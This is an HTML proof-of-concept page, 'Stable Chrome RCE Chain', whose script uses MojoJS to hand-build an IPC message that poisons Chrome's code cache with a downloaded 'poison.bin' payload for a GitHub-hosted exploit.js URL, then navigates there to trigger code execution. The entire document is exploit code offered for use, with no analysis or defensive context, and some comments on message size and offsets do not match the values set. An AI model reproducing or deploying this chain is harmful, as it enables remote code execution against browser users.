<!DOCTYPE html>
<html>
<head>
    <title>V8 Sandbox Escape PoC</title>
</head>
<body>
    <h1>Stable Chrome RCE Chain</h1>
    <button id="launch">Poison Cache & Pop Calc</button>

    <script>
        // Configuration
        const TARGET_URL = "https://linux-1723.github.io/test/exploit.js";
        const PAYLOAD_PATH = "poison.bin";

        async function pwn() {
            console.log("[*] Downloading malicious bytecode...");
            const resp = await fetch(PAYLOAD_PATH);
            const poisonBlob = await resp.arrayBuffer();

            console.log("[*] Binding Mojo CodeCacheHost...");
            const pipe = Mojo.createMessagePipe();
            Mojo.bindInterface('blink.mojom.CodeCacheHost', pipe.handle1);

            const bufferSize = poisonBlob.byteLength;
            const sharedBuffer = Mojo.createSharedBuffer(bufferSize);
            const mapping = sharedBuffer.handle.mapBuffer(0, bufferSize);
            new Uint8Array(mapping.buffer).set(new Uint8Array(poisonBlob));

            // Constructing the 144-byte Mojo Message
            const msg = new ArrayBuffer(184); // Increased size!
            const v = new DataView(msg);
            
            // 0. Header (24 bytes)
            v.setUint32(0, 24, true); 
            v.setUint32(4, 0, true);  // Version
            v.setUint32(8, 0, true);  // Interface ID
            v.setUint32(12, 1, true); // Message ID (DidGenerateCacheableMetadata)
            v.setUint32(16, 0, true); // Flags
            v.setUint32(20, 0, true); // Padding

            // 24. Params Struct (48 bytes)
            v.setUint32(24, 48, true); // Struct size
            v.setUint32(28, 0, true);  // Version
            v.setUint32(32, 0, true);  // CodeCacheType (kJavascript)
            v.setUint32(36, 0, true);  // Padding
            v.setBigUint64(40, 32n, true); // Offset to URL struct (points to 72)
            v.setBigUint64(48, 96n, true); // Offset to Time struct (points to 144)
            
            // BigBuffer Union - SharedMemory
            v.setUint32(56, 16, true); // Union size
            v.setUint32(60, 1, true);  // Tag (shared_memory)
            v.setBigUint64(64, 96n, true); // Offset to SharedMemory struct (points to 160)

            // 72. URL Struct (16 bytes)
            v.setUint32(72, 16, true);
            v.setUint32(76, 0, true);
            v.setBigUint64(80, 8n, true); // Offset to String Array (points to 88)

            // 88. String Array (Mojo arrays need 8-byte headers)
            // Header + 43 chars = 51 bytes. Aligned to next 8-byte boundary = 56.
            v.setUint32(88, 56, true); 
            v.setUint32(92, TARGET_URL.length, true); // Num elements
            for(let i=0; i<TARGET_URL.length; i++) {
                v.setUint8(96+i, TARGET_URL.charCodeAt(i));
            }
            // String ends safely at 139. Next clean boundary is 144.

            // 144. Time Struct (16 bytes)
            v.setUint32(144, 16, true);
            v.setUint32(148, 0, true);
            v.setBigUint64(152, 0n, true); // internal_value

            // 160. Shared Memory Region Struct (16 bytes)
            v.setUint32(160, 16, true);
            v.setUint32(164, 0, true);
            v.setUint32(168, 0, true); // Handle index 0
            v.setUint32(172, bufferSize, true);

            console.log("[*] Firing IPC Poisoning...");
            pipe.handle0.writeMessage(msg, [sharedBuffer.handle]);

            console.log("[+] Cache Poisoned. Detonating in 2 seconds...");
            setTimeout(() => {
                // Navigating to the script URL forces Chrome to look at the (poisoned) cache
                window.location.href = TARGET_URL;
            }, 2000);
        }

        document.getElementById('launch').onclick = pwn;
    </script>
</body>
